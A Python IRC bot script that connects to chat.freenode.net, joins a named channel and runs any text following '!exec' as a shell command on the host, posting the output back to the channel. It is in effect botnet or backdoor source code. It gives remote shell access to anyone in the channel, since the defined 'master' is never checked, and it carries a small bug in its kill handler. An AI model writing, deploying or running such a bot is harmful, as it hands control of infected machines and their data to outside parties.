#! /usr/bin/env python3

from threading import Thread
import subprocess
import os
import time
import socket
import ssl
from random import randint

#########

with open('/etc/hostname', 'r') as h:
    nick = 'bot-' + h.readline().strip('\n') + '-' + str(randint(1, 999))
chan = '#supersecretroom'
master = 'avapxia'

serv = 'chat.freenode.net'
port = 6697
killme = False

#########

def check_ping(host):
    """
    Returns True if host (str) responds to a ping request.
    Remember that a host may not respond to a ping (ICMP) request even if the host name is valid.
    """

    # Option for the number of packets as a function of
    param = '-c'

    # Building the command. Ex: "ping -c 1 google.com"
    command = ['ping', param, '1', host]

    return subprocess.call(command) == 0

class Irclient:
    def __init__(self):
        self.nick = nick
        self.chan = chan
        self.master = master
        self.serv = serv
        self.port = port

    def ping(self): # respond to server Pings.
        self.sock.send(bytes("PONG :pingis\n", "UTF-8"))

    def joinchan(self): # join channel(s).
        self.sock.send(bytes("JOIN "+ self.chan +"\n", "UTF-8"))
        ircmsg = ""
        while ircmsg.find("End of /NAMES list.") == -1:
            ircmsg = self.sock.recv(2048).decode("UTF-8").strip('\n\r')

    def connect(self):
        while check_ping('8.8.8.8') == False:
            time.sleep(2)
        self.sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
        self.sock.connect((self.serv, self.port))
        print('setting Nick')
        self.sock.send(bytes("USER "+ self.nick +" "+ self.nick +" "+ self.nick + " " + self.nick + "\n", "UTF-8"))
        self.sock.send(bytes("NICK "+ self.nick +"\n", "UTF-8"))
        print('Joining Chan')
        self.joinchan()
        self.listen_thread = Thread(target=self.listen)
        self.listen_thread.start()

    def exec_cmd(self, cmd):
        output = subprocess.check_output(cmd, shell=True)
        print(output)
        self.sendmsg(output)

    def sendmsg(self, msg, target=None): # sends messages to the target.
        if target is None:
            target = self.chan
        msg = msg.decode()
        if msg.find('\n'):
            data = msg.split('\n')
            for payload in data:
                self.sock.send(bytes("PRIVMSG "+ target +" :"+ payload +"\n", "UTF-8"))

    def listen(self):
        global killme
        while killme is not True:
            ircmsg = self.sock.recv(2048).decode("UTF-8").strip('\n\r')
            print(ircmsg)
            if ircmsg.find("PRIVMSG") != -1:
                print('PRIVMSG')
                msg = ircmsg.split('PRIVMSG',1)[1].split(':',1)[1]
                print(msg)
                if msg.find('!exec') != -1:
                    print('OUIIII')
                    cmd = msg.split('!exec', maxsplit=1)[1]
                    print('Executing ' + cmd)
                    self.exec_cmd(cmd)
                if msg.find('!kill' + self.nick) != -1:
                    sendmsg('Understood. Shutting down')

            else:
                if ircmsg.find("PING :") != -1:
                    self.ping()
